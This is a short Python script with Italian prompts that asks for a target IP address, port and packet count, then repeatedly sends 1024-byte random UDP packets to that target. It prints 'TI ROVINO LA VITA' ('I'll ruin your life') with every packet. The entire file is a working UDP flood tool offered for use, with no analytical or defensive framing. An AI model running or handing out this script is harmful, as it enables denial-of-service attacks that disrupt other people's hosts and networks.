import socket
import random

print("Scrivi un ip")
ip = str(input())
print("Scrivi una porta")
port = int(input())
print("Scrivi quanti pk vuoi mandare")
pk = int(input())
pkrandom = random.randbytes(1024)

connessioneudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

connessioneudp.connect((ip, port))

for i in range(pk):
    connessioneudp.sendall(pkrandom)
    print("TI ROVINO LA VITA")
connessioneudp.close()